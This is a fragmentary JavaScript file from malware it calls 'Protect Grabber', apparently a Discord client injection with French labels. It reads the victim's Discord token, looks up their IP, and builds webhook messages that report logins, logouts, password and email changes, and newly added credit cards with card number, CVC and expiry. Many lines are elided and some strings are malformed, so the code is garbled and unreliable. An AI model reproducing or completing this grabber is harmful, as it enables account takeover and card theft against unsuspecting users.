...
async function FirstTime() {
    ...
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then(async (token) => {
        ...
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "Protect"))) {
                fs.rmdirSync(path.join(__dirname, "Protect"));
                if (token == null || token == undefined || token == "") {
                    var {
                        ip
                    } = await getFromURL("https://www.myexternalip.com/json", null)
                    const c = {
                        username: "Protect Grabber",
                        avatar_url: "https://cdn.discordapp.com/attachments/1037711213771108474/1077015758980264006/shield-removebg-preview.png",
                        content: "",
                        embeds: [{
                            title: "Protect Initialiser",
                    ...
                    if(b.avatar === null){
                        usericonurl = "https://cdn.discordapp.com/attachments/1037711213771108474/1077015758980264006/shield-removebg-preview.png"
                    ...
                    const c = {
                        ...
                        embeds: [{
                            ...
                            description: "**Oh Ta Protected Une Personne**](https://github.com/furax124)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                                ...
                                name: "@Copyright",
                                value: `Protect Grabber 2023(https://github.com/furax124)`,
                                inline: !0
								}, {
                    ...
                    if (config['logout-notify'] == "true") {
                        if (token == null || token == undefined || token == "") {
                            ...
                            const c = {
                                ...
                                content: "",
                                embeds: [{
                                    title: "Protect Utilisateur C'est Deconecter (Utilisateur Qui Ne C'est jamais Connecter Avant)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                            ...
                            const c = {
                                ...
                                content: "",
                                embeds: [{
                                    title: "Protect Grabbeur A Détecter une Deconexion",
                                    description: "**Oh Ta Protected Une Personne**](https://github.com/furax124)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                ...
                content: "",
                embeds: [{
                    "title": "Nouveaux Protect Grabber Utilisateur",
                    description: "**Oh Ta Protected Une Personne**(https://github.com/furax124)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                ...
                content: "",
                embeds: [{
                    "title": "Protect Grabber a Détecter Un Changement De Mot De Passe",
                    description: "**Oh Ta Protected Une Personne**(https://github.com/furax124)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
...
async function ChangeEmail(newemail, password, token) {
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
           ...
           const params = {
                username: "Protect Grabber",
                avatar_url: ""https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png",
                content: "",
                embeds: [{
                        "title": "Protect Grabber a Détecter Un Changement D'Email",
                        description: "**Oh Ta Protected Une Personne**](https://github.com/furax124)",
                        "color": config['embed-color'],
                        "fields": [{
                                name: "Injection Info",
...
async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    ...
    var {
        ...
        const params = {
            ...
            content: "",
            embeds: [{
                    "title": "Protect Victim Carte Bleu Ajouter",
                    "description": `
                    **IP:** ${ip}\n\n
            ...
            },
                {
                    ...
                    "color": config['embed-color'],
                    "description": `\`\`\`diff\n${fs.readFileSync('Protected_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
